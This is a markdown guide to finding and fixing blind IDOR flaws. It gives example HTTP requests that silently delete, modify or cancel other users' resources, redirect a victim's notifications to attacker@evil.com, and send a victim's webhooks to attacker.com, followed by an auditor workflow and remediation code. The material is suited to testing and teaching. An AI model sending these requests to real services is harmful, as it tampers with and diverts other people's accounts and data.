# Blind IDOR Exploitation Techniques

## Attack Description
Blind IDOR occurs when exploitation results are NOT visible in the server response. The attacker cannot directly observe whether they accessed unauthorized data. These require creative validation methods and are often higher severity because they affect write/delete operations.

## Blind IDOR vs Generic IDOR

| Aspect | Generic IDOR | Blind IDOR |
|--------|--------------|------------|
| Response | Shows unauthorized data | No visible indication |
| Impact | Data disclosure | Data modification/deletion |
| Validation | Check response content | Cross-account verification |
| Difficulty | Easier to detect | Requires 2+ accounts |

## Common Blind IDOR Scenarios

### 1. Silent Deletion
```http
DELETE /api/saved-items/12345 HTTP/1.1
Authorization: Bearer <attacker_token>

HTTP/1.1 204 No Content
# No indication if item 12345 belonged to attacker or victim
```

### 2. Silent Modification
```http
PUT /api/addresses/9999 HTTP/1.1
{"street": "Hacked Street", "city": "Owned City"}

HTTP/1.1 200 OK
{"success": true}
# Did this modify the attacker's address or victim's?
```

### 3. Email/Notification Hijacking
```http
POST /api/notifications/settings HTTP/1.1
{"user_id": "victim_uuid", "email": "attacker@evil.com"}

HTTP/1.1 200 OK
# Victim's notifications now go to attacker
```

### 4. Privilege Modification
```http
POST /api/team/members/remove HTTP/1.1
{"user_id": "admin_uuid"}

HTTP/1.1 200 OK
# Did attacker just remove themselves or the admin?
```

### 5. Unsubscribe/Deactivation
```http
POST /api/subscriptions/cancel HTTP/1.1
{"subscription_id": "victim_sub_id"}

HTTP/1.1 200 OK
{"message": "Subscription cancelled"}
# Victim loses their subscription
```

## Exploitation Methodology

### Step 1: Setup Test Accounts
```
Account A (Victim): Create resources, note all IDs
- Create saved items, addresses, payment methods
- Note all identifiers for each resource

Account B (Attacker): Will attempt to modify Account A's resources
- Stay logged in as Account B for all attacks
```

### Step 2: Capture Resource Identifiers
From Account A, collect:
```javascript
{
  "saved_item_id": "12345",
  "address_id": "9999",
  "payment_id": "pm_abc123",
  "subscription_id": "sub_xyz789"
}
```

### Step 3: Attempt Blind Modifications
As Account B:
```http
# Try deleting Account A's saved item
DELETE /api/saved-items/12345

# Try modifying Account A's address
PUT /api/addresses/9999
{"street": "IDOR Test"}

# Try cancelling Account A's subscription
POST /api/subscriptions/cancel
{"id": "sub_xyz789"}
```

### Step 4: Verify from Victim Account
Log back into Account A and check:
```
- Is the saved item still there?
- Has the address changed?
- Is the subscription still active?
```

### Step 5: Document Impact
If any modification succeeded:
```markdown
## Vulnerability: Blind IDOR in Address Modification

**Endpoint**: PUT /api/addresses/{id}
**Impact**: Any authenticated user can modify any other user's delivery address
**Steps**:
1. Create Account A, add address (ID: 9999)
2. Create Account B
3. As Account B: PUT /api/addresses/9999 with modified data
4. Verify: Account A's address is now changed

**Business Impact**: Order delivery hijacking, PII modification
```

## Advanced Blind IDOR Techniques

### Timing-Based Detection
```python
import time

# If legitimate request takes 50ms but IDOR takes 200ms
# (due to failed permission check), you can detect success

start = time.time()
response = requests.delete(f"/api/items/{target_id}")
elapsed = time.time() - start

if elapsed < 0.1:  # Suspiciously fast = no auth check
    print("[BLIND IDOR] Likely successful deletion")
```

### Error Message Analysis
```http
# Different errors may indicate IDOR vulnerability

DELETE /api/items/99999
HTTP/1.1 404 Not Found
{"error": "Item not found"}

DELETE /api/items/12345  # (victim's item)
HTTP/1.1 200 OK
{"success": true}
# 200 instead of 403 = IDOR confirmed
```

### Side-Channel Detection
```
1. Modify victim's email notification preferences
2. Trigger an action that sends email
3. Check if email goes to attacker's address
```

### Webhook/Callback Detection
```http
POST /api/integration/webhook HTTP/1.1
{"user_id": "victim_id", "callback_url": "https://attacker.com/callback"}

# If attacker receives webhook callbacks for victim's events = IDOR
```

## Detection Method (For Auditors)

1. **Map all state-changing endpoints**
   - POST, PUT, PATCH, DELETE operations
   - Any endpoint that modifies resources

2. **Identify required parameters**
   - user_id, resource_id, account_id
   - Any parameter that could reference another user's data

3. **Cross-account testing workflow**
   ```
   Account A: Create resource → Note ID
   Account B: Attempt modification → Check result
   Account A: Verify if resource changed
   ```

4. **Automate with Burp Suite**
   - Use Autorize extension
   - Configure two session tokens
   - Replay requests with wrong session

## Remediation

```python
# VULNERABLE - No ownership check
@app.route('/api/addresses/<address_id>', methods=['DELETE'])
def delete_address(address_id):
    db.execute("DELETE FROM addresses WHERE id = ?", address_id)
    return {"success": True}

# SECURE - Verify ownership before modification
@app.route('/api/addresses/<address_id>', methods=['DELETE'])
def delete_address(address_id):
    address = db.query("SELECT * FROM addresses WHERE id = ?", address_id)
    
    if not address:
        return {"error": "Not found"}, 404
    
    if address.user_id != current_user.id:
        return {"error": "Forbidden"}, 403
    
    db.execute("DELETE FROM addresses WHERE id = ?", address_id)
    return {"success": True}
```

## Real Examples

### Pornhub - Silent Photo Deletion ($1,500)
IDOR allowed deleting any user's photos/albums without confirmation.
- https://hackerone.com/reports/380410

### Mozilla - Account Deletion via Session Misbinding
Blind IDOR allowing attacker to delete victim's account entirely.
- https://hackerone.com/reports/3154983

### Automattic - ATO via Email Modification
Blind IDOR allowing changing any user's email → password reset → ATO.
- https://hackerone.com/reports/915114

### TikTok - Memory Privacy Settings ($0)
Blind IDOR to change privacy settings on any user's memories.
- https://hackerone.com/reports/1733627

## Key Insight
**Blind IDORs are often more severe than visible ones.**
They typically affect write/delete operations — modifications that can't be undone.
Always test state-changing endpoints with cross-account verification.
